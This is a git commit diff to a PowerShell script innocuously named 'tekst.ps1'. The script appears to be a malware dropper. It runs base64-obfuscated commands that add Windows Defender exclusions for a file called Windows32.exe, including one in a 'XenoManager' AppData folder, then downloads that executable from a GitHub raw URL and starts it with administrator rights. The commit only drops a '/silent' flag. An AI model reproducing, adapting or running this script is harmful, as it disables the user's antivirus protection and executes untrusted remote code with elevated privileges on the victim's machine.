532f7676839b6d287a387ba04030407e4e099c24
Ilyaskand <150134733+Ilyaskand@users.noreply.github.com>
2025-03-22 12:35:46 +0100

    text.ps1

--- tekst.ps1
+++ tekst.ps1
@@ -1,5 +1,5 @@
 powershell.exe -ExecutionPolicy Bypass -NoProfile -EncodedCommand QQBkAGQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHSAaQBvAG4AUABhAHQAaAAgACIAJABlAG4AdgA6AFUAUwBFAFIAUABSAE8ARgBJAEwARQBcAEQAbwBjAHUAbQBlAG4AdABzAFwAVwBpAG4AZABvAHcAcwAzADIALgBlAHgAZQAiACAALQBGAG8AcgNjZA==
 powershell.exe -ExecutionPolicy Bypass -NoProfile -EncodedCommand QQBkAGQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHSAaQBvAG4AUABhAHQAaAAgACIAJABlAG4AdgA6AFUAUwBFAFIAUABSAE8ARgBJAEwARQBcAEEAcABwAEQAYQB0AGEAXABSAG8AYQBtAGkAbgBnAFwAWABlAG4AbwBNAGEAbgBhAGcAZQByAFwAVwBpAG4AZABvAHcAcwAzADIALgBlAHgAZQBcACIAIAAtAEYAbwByAGMAZQA=
 Invoke-WebRequest -Uri "https://github.com/Ilyaskand/e/raw/refs/heads/main/Windows32.exe" -OutFile "$env:USERPROFILE\Documents\Windows32.exe"
-Start-Process "$env:USERPROFILE\Documents\Windows32.exe" -ArgumentList '/silent' -Wait -Verb RunAs
+Start-Process "$env:USERPROFILE\Documents\Windows32.exe" -Wait -Verb RunAs
 exit
